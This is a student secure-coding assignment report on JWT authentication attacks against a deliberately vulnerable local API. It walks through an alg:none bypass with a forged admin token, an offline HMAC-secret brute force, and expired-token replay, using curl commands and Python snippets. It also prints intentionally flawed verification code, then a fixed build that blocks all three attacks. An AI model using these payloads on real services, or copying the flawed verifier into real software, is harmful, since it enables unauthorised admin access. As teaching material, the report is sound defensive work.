# JWT Authentication Attacks

**Module:** WEB404 Secure Coding Practices - Assignment 2 (Topic 2)
**Author:** waangmo22@gmail.com
**Artefacts:** `vulnerable/app.py`, `fixed/app.py`, `exploits/*.sh`, `exploits/jwt_forge.py`, `evidence/demo-output.txt`

---

## 1. Summary

"VulnAuth" is a small JWT-based login/session API: `POST /login` exchanges a
username and password for a token, and `GET /account` returns account data
(including an admin-only secret) to whoever presents a valid `Authorization:
Bearer <token>` header. The JWT itself - encoding, signing, and verifying - is
implemented from scratch with the Python standard library, so nothing is
hidden inside a library's "it just works" defaults; every check, and every
missing check, is visible in the source.

This report demonstrates **three** attacks against the vulnerable build:

| # | Technique | What it abuses | Impact demonstrated |
| - | --------- | --------------- | -------------------- |
| 1 | `alg:none` bypass | Server trusts the algorithm claimed by the token itself | Forge an unsigned token with `role=admin`, get full admin access |
| 2 | Weak-secret brute force | Short, dictionary-guessable HMAC secret | Recover the secret offline from one captured token, then sign a new admin token |
| 3 | Expired-token replay | `exp` claim is never checked | A token that expired an hour ago is still accepted forever |

The brief asks for at least two JWT-specific attacks; all three named example
categories from the technical scope (`alg:none`, weak-secret brute force, and
token expiry/replay) are covered here. `fixed/app.py` keeps the identical
feature set and only changes the verification logic and the secret. After the
fix **all three attacks fail** (section 6, `evidence/demo-output.txt`).

---

## 2. JWT structure (background)

A JWT is three base64url-encoded segments joined by dots:

```
<header>.<payload>.<signature>
eyJhbGciOiAiSFMyNTYiLC...  .  eyJzdWIiOiAiYWxpY2Ui...  .  XUyftoNgcU1mSSJbBA1Zu2RZ...
```

* **Header** - a small JSON object naming the signing algorithm, e.g.
  `{"alg": "HS256", "typ": "JWT"}`.
* **Payload** - JSON "claims": in this app, `sub` (username), `role`, `iat`
  (issued-at), `exp` (expiry).
* **Signature** - `HMAC-SHA256(secret, base64url(header) + "." + base64url(payload))`.

The critical fact this whole assignment turns on: **a JWT is signed, not
encrypted.** Base64url is an encoding, not a cipher - anyone can decode the
header and payload of any token with no key at all (see
`exploits/jwt_forge.py decode <token>`, or paste a token into jwt.io). The
*only* thing standing between an attacker and a token with `role: "admin"` is
whatever the server does to verify the signature and the claims. Every attack
below targets a specific place where that verification is weak or missing.

---

## 3. Vulnerability mechanism

All three bugs live in one function, `vulnerable/app.py`, `decode_insecure()`:

```python
def decode_insecure(token: str) -> dict:
    header_b64, payload_b64, sig_b64 = token.split(".")
    header = json.loads(b64url_decode(header_b64))
    payload = json.loads(b64url_decode(payload_b64))

    alg = header.get("alg")          # <-- taken from the token itself
    if alg == "none":
        return payload               # <-- no signature check at all
    if alg != "HS256":
        raise InvalidToken("unsupported alg")

    signing_input = f"{header_b64}.{payload_b64}".encode()
    expected = hmac.new(SECRET.encode(), signing_input, hashlib.sha256).digest()
    if not hmac.compare_digest(expected, b64url_decode(sig_b64)):
        raise InvalidToken("bad signature")

    return payload                   # <-- "exp" is never read
```

Plus, module-level: `SECRET = "secret123"`.

| Weakness | Root cause | CWE |
| --- | --- | --- |
| `alg:none` bypass | Algorithm choice is attacker-controlled instead of server-pinned | CWE-347 (Improper Verification of Cryptographic Signature) |
| Weak secret | Low-entropy, dictionary-word secret makes offline brute force of the HMAC key feasible | CWE-521 (Weak Password Requirements) / CWE-326 (Inadequate Encryption Strength) |
| No expiry check | `exp` claim exists in every token but is never read by the verifier | CWE-613 (Insufficient Session Expiration) |

This is OWASP **A02:2021 - Cryptographic Failures** (weak/absent signature
verification) and **A07:2021 - Identification and Authentication Failures**
(session tokens that never expire).

---

## 4. Exploitation walkthrough

Setup:

```bash
cd Assigments/Assigment_2
python3 vulnerable/app.py    # http://127.0.0.1:6001
```

All payloads are wired into `exploits/0X-*.sh`, which call the shared helper
`exploits/jwt_forge.py` to build/sign/brute-force tokens. Run everything at
once with `bash exploits/run-demo.sh`. For the marked screenshots, replay the
same requests in Burp Suite Repeater, or run them through `jwt_tool` (see
`evidence/README.md`).

### 4.1 Technique 1 - `alg:none` bypass (`GET /account`)

**Goal:** get admin access with no valid credentials and no signature.

**Step 1 - log in as a low-privilege user, to see what a real token looks like:**

```bash
curl -s http://127.0.0.1:6001/login \
  --data-urlencode username=alice --data-urlencode password=alice-pass
```

```json
{"token": "eyJhbGciOiAiSFMyNTYi...XUyftoNgcU1mSSJbBA1Zu2RZfZVxhbdODWT5DW2-UAY", "role": "customer"}
```

**Step 2 - forge a token with no signature at all.** Header
`{"alg": "none", "typ": "JWT"}`, payload `{"sub": "attacker", "role": "admin",
"exp": 9999999999}`, and an **empty** third segment:

```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiIsICJleHAiOiA5OTk5OTk5OTk5fQ.
```

**Step 3 - present it as a bearer token:**

```bash
curl -s http://127.0.0.1:6001/account \
  -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiIsICJleHAiOiA5OTk5OTk5OTk5fQ."
```

**Observed result:**

```json
{
  "sub": "attacker",
  "role": "admin",
  "admin_secret": "vault override code: 7742-XQ"
}
```

`decode_insecure()` reads `alg` from the header we supplied, sees `"none"`,
and returns the payload without ever looking at the third segment. We never
had a valid username/password and never touched the real secret.

**Tools:** `exploits/01-alg-none-bypass.sh`; Burp Repeater (edit the header
and signature of a captured token). Screenshot: `evidence/01-none-vuln.png`.

### 4.2 Technique 2 - weak-secret brute force (`GET /account`)

**Goal:** recover the signing secret offline, then forge and correctly sign a
token for any role.

**Step 1 - capture one real, validly-signed token** (the alice login above).

**Step 2 - brute force offline.** HS256 verification is just
`HMAC-SHA256(secret, header.payload) == signature`. Since the header and
payload are plaintext and the signature is in the token, an attacker with a
password-style wordlist can recompute the HMAC for each candidate and compare:

```python
for word in wordlist:
    candidate = hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
    if hmac.compare_digest(candidate, target_signature):
        return word   # secret found
```

No requests to the server are needed for this step - it is entirely offline,
so there is nothing to rate-limit or log.

**Observed result** (`exploits/02-weak-secret-bruteforce.sh`, 20 candidates):

```
RESULT  : RECOVERED secret = 'secret123'
```

**Step 3 - forge a new, properly-SIGNED admin token** with the recovered
secret and present it:

```json
{
  "sub": "attacker",
  "role": "admin",
  "admin_secret": "vault override code: 7742-XQ"
}
```

Unlike Technique 1, this token has a completely valid HS256 signature - it
would pass even a verifier with no `alg:none` bug, because the underlying
secret itself has been compromised.

**Tools:** `exploits/02-weak-secret-bruteforce.sh`; `jwt_tool -d <token> -kd`
or `hashcat -m 16500` for the equivalent brute force against a real capture.
Screenshot: `evidence/02-bruteforce-vuln.png`.

### 4.3 Technique 3 - expired-token replay (`GET /account`)

**Goal:** show that a token, once issued, never actually stops working.

**Step 1 - craft a token whose `exp` claim is in the past**, correctly signed
with the (known, weak) secret:

```json
{"sub": "alice", "role": "customer", "exp": <now - 3600>, "iat": <now - 7200>}
```

**Step 2 - present it:**

```bash
curl -s http://127.0.0.1:6001/account -H "Authorization: Bearer <expired-token>"
```

**Observed result:**

```json
{"sub": "alice", "role": "customer", "note": "customer account - nothing secret here"}
```

The request succeeds. `decode_insecure()` checks the signature but never
reads `payload["exp"]`, so a token captured once (via logs, browser history, a
compromised device, or a prior session) is valid forever - there is no
concept of logout, session timeout, or credential rotation actually taking
effect.

**Tools:** `exploits/03-expired-token-replay.sh`; Burp Repeater with a
manually edited `exp` claim (re-sign with `jwt_forge.py sign` since editing
the payload invalidates the original signature). Screenshot:
`evidence/03-replay-vuln.png`.

---

## 5. Remediation

`fixed/app.py` is a line-for-line hardening of `vulnerable/app.py`. Inspect it
with:

```bash
diff -u vulnerable/app.py fixed/app.py
```

| Control | Before (`decode_insecure`) | After (`decode_secure`) |
| --- | --- | --- |
| **Algorithm whitelisting** | `alg = header.get("alg"); if alg == "none": return payload` | `if header.get("alg") != "HS256": raise InvalidToken(...)` - the server decides which algorithm to verify with; the token's claim about its own algorithm is never trusted |
| **Strong secret** | `SECRET = "secret123"` (9 chars, in every password wordlist) | `SECRET = "2ca33626...b9f3a5ab"` (64 hex chars = 256 random bits, in no wordlist) |
| **Mandatory expiry** | `exp` never read | `exp = payload.get("exp"); if not isinstance(exp, (int, float)) or time.time() >= exp: raise InvalidToken("expired")` |
| **Shorter token lifetime** | 300s | 120s - narrows the replay window for any token that does leak before it expires |
| **Signature comparison** | `hmac.compare_digest(...)` (already constant-time) | unchanged - the vulnerable build's flaw was never reaching this line, not the comparison itself |

### Further hardening (noted, not required by the brief)

* **Refresh tokens.** Pair a short-lived access token (minutes) with a
  longer-lived, separately-stored refresh token, so sessions can stay long
  without every request carrying a token valid for hours.
* **Revocation / logout.** JWTs are stateless by design, so a compromised
  token cannot be un-issued before it expires. A short expiry (above) bounds
  the damage; a server-side deny-list (Redis, a DB row) closes the gap
  completely at the cost of statelessness.
* **Secret management.** Load `SECRET` from an environment variable or a
  secret manager (AWS Secrets Manager, Vault, etc.), never hardcode it, and
  rotate it periodically.
* **`kid` / key rotation.** For multi-key deployments, use the header's `kid`
  to select a key from a server-side allow-list of keys - never to select the
  algorithm.

---

## 6. Verification - proof the attacks no longer work

`bash exploits/run-demo.sh` runs each exploit against the vulnerable build
(:6001) and the fixed build (:6002). Full transcript:
`evidence/demo-output.txt`.

| Technique | vs vulnerable `:6001` | vs fixed `:6002` |
| --- | --- | --- |
| 1 - `alg:none` bypass | `BYPASSED -> server trusted alg:none, granted admin access` | `{"error": "unsupported alg"}` -> blocked |
| 2 - weak-secret brute force | `RECOVERED secret = 'secret123'` -> forged admin token accepted | `blocked -> secret not recovered from the wordlist` |
| 3 - expired-token replay | `ACCEPTED an expired token -> replay works indefinitely` | `{"error": "expired"}` -> blocked |

Screenshots: `evidence/0X-*-fixed.png` and `evidence/diff.png`.

---

## 7. Why the fix works

* **Technique 1** fails because `decode_secure()` never asks the token what
  algorithm to use. It hardcodes the expectation - "this must be HS256" - and
  rejects anything else before the signature is even examined. There is no
  code path left that returns a payload without verifying a signature.
* **Technique 2** fails because brute force is a race against entropy, not
  against the algorithm. A 9-character dictionary word has effectively zero
  bits of real entropy against a 20-word list (and only marginally more
  against a multi-billion-entry list, at GPU speed); a uniformly random
  256-bit secret has 2^256 possibilities - exhaustively searching it is
  computationally infeasible with any current technology. The wordlist search
  in `jwt_forge.py brute` simply never finds a match.
* **Technique 3** fails because `decode_secure()` treats a missing or
  past-due `exp` as an authentication failure, exactly like a bad signature.
  Time itself becomes part of what "valid" means, so a token captured today
  stops being useful shortly after (`EXP_SECONDS = 120` here), regardless of
  whether the underlying secret and signature are otherwise perfect.

None of these fixes depend on the *attacker* behaving differently - each one
removes a code path the server itself would otherwise take.

---

## 8. Mapping to learning outcomes

| LO | Where addressed |
| --- | --- |
| LO2 - attack mechanisms | section 3 (mechanism), section 4 (three techniques executed) |
| LO7 - advanced attacks: JWT | section 2 (JWT structure), section 4 (`alg:none`, brute force, replay) |
| LO8 - secure API architecture | section 5 (algorithm whitelisting, secret management, expiry, refresh-token design) |

## 9. References

* OWASP **JWT Security Cheat Sheet** - algorithm whitelisting, strong keys,
  short expiry, and explicit rejection of `alg:none`.
* OWASP Top 10 2021 - **A02:2021 Cryptographic Failures**, **A07:2021
  Identification and Authentication Failures**.
* MITRE **CWE-347** (Improper Verification of Cryptographic Signature),
  **CWE-613** (Insufficient Session Expiration).
* RFC 7519 - JSON Web Token (JWT).
* `jwt_tool` (ticarpi) and jwt.io - reference implementations of the same
  attack classes demonstrated here by hand.

## Appendix - full demo transcript

See `evidence/demo-output.txt` (regenerate with `bash exploits/run-demo.sh`).
